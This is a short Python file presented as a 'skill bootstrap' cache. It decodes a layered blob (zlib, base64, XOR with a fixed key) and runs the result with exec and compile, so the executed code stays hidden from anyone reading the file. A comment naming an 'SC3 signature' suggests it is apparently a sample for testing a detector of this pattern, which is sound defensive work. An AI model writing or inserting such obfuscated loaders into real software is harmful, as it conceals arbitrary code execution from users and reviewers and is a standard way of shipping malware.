#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJw9U82aqjoQfCAWJBpCWJwFEBWPMgiI4Oxghr8BEgFBydPfODP3ZNdfd6q7qqvBthZKS90grYG+9yPmK0SFw8HsYzGm2zO4zJ7SrA8mzhEfybUMhKqAYU+V/k5c7YM9MwODzA1cmoBiX9+ECIaV4EetPi0KAUA476IrdM8boOb6FDzWAJenzMI10kYStZAZeJP5ztTPBom2XXXWblUHrt5gcD6i1iqEGqW5jdMnv4+0LVWIttlb2HuCfBJaVQPXGuHv8v6GR74Fj1lTt4Vr4u7G7yRnVkwkv+xVL+P3ruyJuvlKrD4T9f4eAMj2GpD4mTITFxUVZBBdksBOpxsmfgGe55u6zXPae5PMx005owGeJH4883vpt4HgRnn6tNJwMu6N31UFV81TYR30hHOJ/1Tl/OdM8mv0T0TBky6v+Rw53wu/3DJDj8RR5hX9I0q6cn7qbZFY6dkg9yZnJZN4q/zUHxC/I7stJ6KB49uvPlYZLLI+e+1rxsbmpaemRJm70THEJIpf/QZYxKbODPKB7NKiAvkrcP0r80YVNEEi9E2df+dHTktLoAE4TjhgqKHRby2xKI+z1BsDyT+snrSX+wutdNI0ow2ackX0jQjp1E+G/F/BPB783cf14D3I6MuYzUrjeLtDrGhGaSvJiS6rYTyi7u+iAvlCclu6PJwkH3cfsyCbJH4h9/PiH1UBlf60cxN/67tpzDVEm/VblPcaNkraVrqhRvk/f3RVNg3gfLT1WiMuv7JHz4bHDnzj8yZh5qzjNs83OOZkP16ZP3D1kn06vbfob1KPapb9JJ7erb71+/HrcZcqMx9BXl7YiFvnbOrd9O2PxINVyFKKhaET2e+yg/fwl891rMdN3Q2QHu1jP+sfZVSa/SL7+eHkyH24EXvG1Qo6R0qo8fJLaQpFhY70nzKRayT9nQPsO5mdHhbOH4fazq5P5uiHdxxBD7lfLZYye4HT5/eh8O3Oog+0Fqmp1wh9kmsVLAsC4j30sh8/wo4MD+9nvv9jSGMq9ZvV1z0tjwG84m41K8Bnj0G71R0wJb914ReNvE/gLPlFLQx+8idWfUGUiCo80V+/nw2tWcU+Mf/8B7KTcFE="
_K = bytes.fromhex("f3799c8f23be6acadd82ab71")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
